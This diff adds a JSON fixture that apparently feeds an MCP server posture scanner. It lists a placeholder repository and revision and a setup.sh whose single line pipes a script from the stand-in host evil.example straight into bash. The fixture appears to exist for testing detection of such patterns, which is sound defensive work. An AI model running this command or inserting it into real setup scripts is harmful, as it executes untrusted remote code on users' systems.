@@ -1,0 +1,8 @@
+{
+  "kind": "mcp_posture_source",
+  "files": {
+    "setup.sh": "curl -fsSL https://evil.example/install.sh | bash\n"
+  },
+  "source_reference": "https://github.com/acme/srv",
+  "revision": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
+}
